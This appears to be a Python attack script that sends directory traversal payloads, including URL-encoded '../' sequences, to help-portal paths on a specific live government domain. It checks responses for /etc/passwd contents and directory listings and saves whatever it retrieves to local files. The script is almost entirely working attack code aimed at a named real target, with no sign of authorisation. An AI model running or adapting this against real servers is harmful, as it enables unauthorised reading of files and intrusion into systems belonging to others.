import requests
from urllib.parse import urljoin, quote
import base64

def test_directory_traversal(base_url: str, payload: str, follow_redirects: bool = True, save_content: bool = False) -> str:
    """
    Tests for directory traversal vulnerability, following redirects.
    
    Args:
    - base_url (str): The base URL to test.
    - payload (str): The directory traversal payload.
    - follow_redirects (bool): Whether to follow redirects. Defaults to True.
    - save_content (bool): Whether to save the response content. Defaults to False.
    
    Returns:
    - str: The response text if the test is successful, otherwise None.
    """
    try:
        url = urljoin(base_url, payload)
        response = requests.get(url, timeout=10, allow_redirects=follow_redirects)
        print(f"[*] Testing: {url}")
        print(f"  Status Code: {response.status_code}")
        if response.status_code == 200:
            print("  Possible directory traversal success!")
            if "passwd" in url:
                print("  Likely found /etc/passwd!")
            if "<title>Index of" in response.text or "Directory Listing" in response.text:
                print("  Directory listing found!")
            if save_content:
                filename = payload.replace("/", "_")
                with open(filename, "wb") as f:
                    f.write(response.content)
                print(f"  Content saved to: {filename}")
            else:
                print("  Content (First 200 chars):")
                print(response.text[:200] + "...")  
            return response.text
        elif response.status_code == 403:
            print("  Access Forbidden - Possible success, but access denied. Check permissions")
            return None
        elif response.status_code in [302, 301]:
            print("  Redirect - re-test, following the redirect...")
            if follow_redirects:
                return test_directory_traversal(base_url, payload, follow_redirects=False)
            else:
                return None
        else:
            print(f"  Response: {response.text[:200]}...")  
            return None
    except requests.exceptions.RequestException as e:
        print(f"  Error: {e}")
        return None

# Configuration
base_url = "http://ms.gov/"  
# Test Payloads
payloads = [
    "msi/help_portal/Home/%2e%2e%2f",
    "msi/help_portal/Home/",
    "msi/help_portal/Content/base/msi/images/favicon.ico",
    "msi/help_portal/Content/base/msi/images/%2e%2e%2f"
]

def test_payloads(base_url: str, payloads: list, save_content: bool) -> None:
    """Tests each payload against the base URL."""
    for payload in payloads:
        test_directory_traversal(base_url, payload, save_content=save_content)

# Run the tests
test_payloads(base_url, payloads, save_content=True if "favicon.ico" in payloads[2] else False)
```

**